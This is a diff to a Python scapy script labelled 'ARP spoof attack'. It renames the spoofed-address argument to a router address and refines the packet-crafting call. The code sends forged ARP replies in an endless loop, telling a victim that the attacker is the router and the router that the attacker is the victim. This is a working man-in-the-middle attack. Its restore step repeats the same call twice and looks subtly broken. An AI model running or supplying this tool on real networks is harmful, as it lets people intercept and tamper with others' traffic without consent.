@@ -8,7 +8,7 @@ import argparse
 def get_arguments():
 	parser = argparse.ArgumentParser(description= "ARP spoof attack")	
 	parser.add_argument("--target", dest= "victimIP", help= "Input specify Victim IP addres", required= True)
-	parser.add_argument("--spoof", dest= "spoofIP", help= "Input specify Spoofing IP addres", required= True)
+	parser.add_argument("--router", dest= "routerIP", help= "Input specify router IP addres", required= True)
 	return parser.parse_args()
 
 def getmac(ip):	
@@ -18,9 +18,10 @@ def getmac(ip):
 	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 	return  answered_list[0][1].hwsrc
 
-def spoof(target_ip, spoof_ip):
+def spoof(target_ip, router_ip):
 	target_mac = getmac(target_ip)
-	arp_respond = scapy.ARP(op= 2, pdst= target_ip, hwdst= target_mac, psrc= spoof_ip)
+	#arp_respond = scapy.ARP(op= 2, pdst= target_ip, hwdst= target_mac, psrc= router_ip)
+	arp_respond = scapy.ARP(op= 2, pdst= target_ip, hwdst= getmac(target_ip), psrc= router_ip)
 	#arp_respond = scapy.ARP(op="1 for request 2 for respond,pdst="victim-ip",hwdst="victim-mac",psrc="Router-ip")
 	scapy.send(arp_respond, verbose= False)
 
@@ -36,9 +37,9 @@ count = 0
 try:
 	while True:		
 		#telling client i am the router
-		spoof(args.victimIP, args.spoofIP)
+		spoof(args.victimIP, args.routerIP)
 		#telling router i am the client
-		spoof(args.spoofIP, args.victimIP)		
+		spoof(args.routerIP, args.victimIP)		
 		count = count + 2
 		print("\r[+] send two packets {}".format(count))
 		time.sleep(2)
@@ -46,7 +47,7 @@ try:
 except KeyboardInterrupt:
 
 		print("\n[+] Detected CTRL+C Quitting and restoring arp value please wait")
-		restore(args.victimIP, args.spoofIP)
+		restore(args.victimIP, args.routerIP)
 		#restoring client
-		restore(args.victimIP, args.spoofIP)
+		restore(args.victimIP, args.routerIP)
 		#restoring router
